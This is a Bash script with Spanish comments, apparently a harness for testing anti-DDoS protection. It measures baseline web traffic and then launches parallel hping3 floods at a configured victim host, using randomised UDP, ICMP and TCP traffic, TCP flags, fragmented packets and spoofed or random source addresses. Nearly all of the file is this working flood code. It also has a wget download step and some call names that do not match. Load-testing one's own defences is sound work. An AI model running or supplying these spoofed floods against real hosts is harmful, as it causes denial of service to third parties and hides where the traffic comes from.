#!/bin/bash

# Copyright 2022 Pablo Vargas <pvr.mza@gmail.com>
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#   http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

# requirements
#   - https://github.com/rakyll/hey
#        sudo wget https://hey-release.s3.us-east-2.amazonaws.com/hey_linux_amd64 -O /usr/local/bin/ab_key
#        sudo chmod 755 /usr/local/bin/ab_key
#
#   - hping3
#        sudo apt install hping3

##########################
# puerto de de ataques mas comunes
TCP_PORT_LIST="20 21 22 25 80 389 443 3306 3389 5938"
UDP_PORT_LIST="7 17 19 53 69 111 123 137 161 389 443 1900 3702 5683 10001 11211"
ICMP_TYPE="0 3 4 5 8 11 13 14 17"
#
TCPFLAG[0]="-F" #Set FIN tcp flag.
TCPFLAG[1]="-S" #Set SYN tcp flag.
TCPFLAG[2]="-R" #Set RST tcp flag.
TCPFLAG[3]="-P" #Set PUSH tcp flag.
TCPFLAG[4]="-A" #Set ACK tcp flag.
TCPFLAG[5]="-U" #Set URG tcp flag.
TCPFLAG[6]="-X" #Set Xmas tcp flag.
TCPFLAG[7]="-Y" #Set Ymas tcp flag.
##########################
source ./parametros.conf || exit 1
#
LOG="resultados-antiDDoS-$VICTIMA-$(date +%Y%m%d-%H%M).txt"
##########################
# modo test
if [ ! -z $1 ] && [ $1 = "-test" ]; then
    sleep () {
        echo "sleep $@"
    }

    hping3 () {
        echo "hping3 $@"
    }

    ab_key () {
        echo "ab_key $@"
    }

    clear () {
        echo "clear $@"
    }    
fi

mata_hping () {
    for n in {1..3}
    do
        for i in $(ps aux | egrep "hping3|ab_key" | awk '{ print $2}') ; do kill -9 $i; done
    done
}
me_demoro () {
    # todo para mostrar un mensajito cada 30 segundos...
    c=$(expr $TIEMPO \* 60 / 30)
    for t in $(seq 1 $c )
    do
        date|tee -a $LOG
        sleep 30
    done    
}
##########################
# me aseguro que no hayan otros procesos de hping/ab_hey corriendo
mata_hping 2> /dev/null

clear
date > $LOG
echo "$(date) - Iniciando ataque a $VICTIMA" |tee -a $LOG
echo "              $TITULO" |tee -a $LOG
if [ ! -z $1 ] && [ $1 = "-fast" ]; then
    echo "$(date) - Paso 1 - Script ejecutado en modo rapido. No se genera trafico de muestra" |tee -a $LOG
else     
    echo "$(date) - Paso 1 - Generando metricas de trafico Web de muestra ( $TIEMPO min - $HILOS hilos - $REQ req x hilo)" |tee -a $LOG
    ab_hey -z ${TIEMPO}m -c $HILOS -q $REQ http://$VICTIMA/index1.html  >> $LOG &
    #
    me_demoro
    #
    sleep 3
fi
echo "$(date) - Paso 2 - Prafico normal pre ataque ( $TIEMPO min - $HILOS hilos - $REQ req x hilo)" |tee -a $LOG
ab_hey -z ${TIEMPO}m -c $HILOS -q $REQ http://$VICTIMA/index1.html  >> $LOG &

echo "$(date) - Esperando 60 segundos antes del ataque..." | tee -a $LOG
sleep 60
#

echo "$(date) - Paso 3 - Iniciando $PARALELO ataques en paralelo a $VICTIMA "  |tee -a $LOG
for c in `seq 1 $PARALELO`
do
    # tamaño del paquete aleatoreo
    DATA=$(expr 1000 + ${RANDOM:0:3} + ${RANDOM:0:3})
    if [ "$DATA" -gt "1499" ]; then
        FRAG="(Fragmentado)"
    else
        FRAG=""
    fi
    #
    # ttl aleatoreo entre 50 y 67
    ttl=$(echo $RANDOM % 17 + 50| bc)

    # Modo de ataque
    modo_id=$(echo $RANDOM % ${#MODOS[@]} | bc)
    case ${MODOS[$modo_id]} in 
        DIRECTO|directo)
            MODO_TEXT="DIRECTO"
            MODO="-s ++1024 -p"
            ;;
        REFLEJADO|reflejado)
            MODO_TEXT="REFLEJADO"
            MODO="-p ++1024 -s"
            ;;
        esac
    #
    # Modo de ataque
    origen_id=$(echo $RANDOM % ${#ORIGENES[@]} | bc)
    case ${ORIGENES[$origen_id]} in 
        UNICO|unico)
            ORIGEN_TEXT="UNICO"
            ORIGEN=" --spoof $ATACANTE_IP "
            ;;
        RANDOM|random)
            ORIGEN_TEXT="RANDOM"
            ORIGEN=" --rand-source "
            ;;
        esac
    #

    proto_id=$(echo $RANDOM % ${#PROTOCOLOS[@]} | bc)
    case ${PROTOCOLOS[$proto_id]} in 
        UDP|udp)
            PROTO_TEXT="UDP"
            PROTO="--udp"
            PORT_LIST="$UDP_PORT_LIST"
            ;;
        ICMP|icmp)
            PROTO_TEXT="ICMP"
            PROTO="--icmp"
            PORT_LIST="$ICMP_TYPE"
            ;;
        TCP|tcp)
            PROTO_TEXT="TCP"
            PROTO=""
            PORT_LIST="$TCP_PORT_LIST"
            ;;
        esac

    # seleccion un solo puerto/type al azar de la lista de puertos
    PORT=$(for port in $(echo $PORT_LIST) ; do echo $port; done | sort -R |sort -R | head -1)
    if [ -z $PROTO ]; then
        # FLAG TCP aleatoreo
        size=${#TCPFLAG[@]}
        rand_index=$(($RANDOM % $size))
        FLAG=${TCPFLAG[$rand_index]}
    else
        if [ $PROTO = "--icmp" ]; then
            # en UDP no van FLAG
            FLAG=""
            MODO="--icmptype"
        else
            FLAG=""
        fi
    fi
    echo "         - Iniciando ataque $MODO_TEXT de origen $ORIGEN_TEXT a $VICTIMA con $PROTO_TEXT/$PORT y paquetes de $DATA bytes${FRAG}en modo flood " |tee -a $LOG
    echo "             hping3 $PROTO --flood --ttl $ttl $FLAG -d $DATA $MODO $PORT $ORIGEN $VICTIMA"  >> $LOG &
    hping3 $PROTO --flood --ttl $ttl $FLAG -d $DATA $MODO $PORT $ORIGEN $VICTIMA  |tee -a $LOG &
done

#
me_demoro
#
sleep 10
# me aseguro que no quede nada corriendo
mata_hping 2> /dev/null
echo "$(date) - Finalizado ataque a $VICTIMA" |tee -a $LOG
clear
echo "*************** Resumen Test *****************"
egrep "Iniciando|ataque |Finalizado|Paso|Total|Requests|Average|Detail|resp " $LOG
echo "*************** Resumen Test *****************"